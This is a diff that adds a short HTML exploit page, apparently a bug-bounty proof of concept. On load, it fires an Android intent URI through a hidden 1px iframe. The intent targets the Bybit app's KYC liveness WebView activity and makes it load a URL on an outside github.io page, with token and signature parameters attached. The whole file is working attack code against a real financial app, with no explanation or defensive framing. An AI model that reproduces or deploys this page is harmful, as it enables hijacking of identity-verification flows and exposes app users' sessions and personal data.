@@ -1,0 +1,11 @@
+<!doctype html><html><body style="font:15px monospace;padding:8px"><h3>KYC-DISP-CHAIN</h3><pre id="o">arming</pre>
+<iframe id="f" style="width:1px;height:1px"></iframe>
+<script>
+var cam='https://createnewdemo.github.io/bbprobe/disp.html';
+var inner=cam+'?cb='+Date.now()+'&token=t&signatureId=s';
+var intent='intent://#Intent;action=android.intent.action.VIEW'
+ +';component=com.bybit.app%2Faai.liveness.web.SolutionActivity'
+ +';S.url='+inner.replace(/&/g,'%26')+';end';
+document.getElementById('o').textContent+='\n'+intent;
+document.getElementById('f').src=intent;
+</script></body></html>
